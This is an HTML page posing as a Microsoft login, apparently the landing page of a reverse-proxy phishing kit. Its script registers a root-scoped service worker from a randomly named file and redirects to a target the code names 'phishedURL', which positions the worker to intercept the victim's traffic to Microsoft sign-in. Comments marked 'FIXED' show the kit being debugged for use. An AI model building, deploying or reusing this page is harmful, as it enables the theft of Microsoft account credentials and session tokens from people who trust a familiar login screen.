<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Login</title>
</head>

<body>
    <script>
        // ── ✅ FIXED: Use "redirect_uri" (lowercase i) ──
        if ("serviceWorker" in navigator) {
            navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
                scope: "/",
            })
                .then((registration) => {
                    // ✅ FIXED: Changed to "redirect_uri"
                    const phishedParameterURL = new URL(self.location.href).searchParams.get("redirect_uri");
                    if (!phishedParameterURL) {
                        console.error("No redirect_uri parameter found");
                        // Fallback: redirect to default
                        window.location.href = "https://login.microsoftonline.com/";
                        return;
                    }
                    
                    const phishedURL = new URL(decodeURIComponent(phishedParameterURL));
                    console.log("🔄 Redirecting to:", phishedURL.href);
                    
                    // Redirect to the real Microsoft login page
                    self.location.replace(`${phishedURL.pathname}${phishedURL.search}`);
                })
                .catch((error) => {
                    console.error(`Service worker registration failed: ${error}`);
                    // Fallback: redirect to Microsoft directly
                    window.location.href = "https://login.microsoftonline.com/";
                });
        }
        else {
            console.error("Service workers are not supported by this browser");
            // Fallback: redirect to Microsoft directly
            window.location.href = "https://login.microsoftonline.com/";
        }
    </script>
</body>

</html>
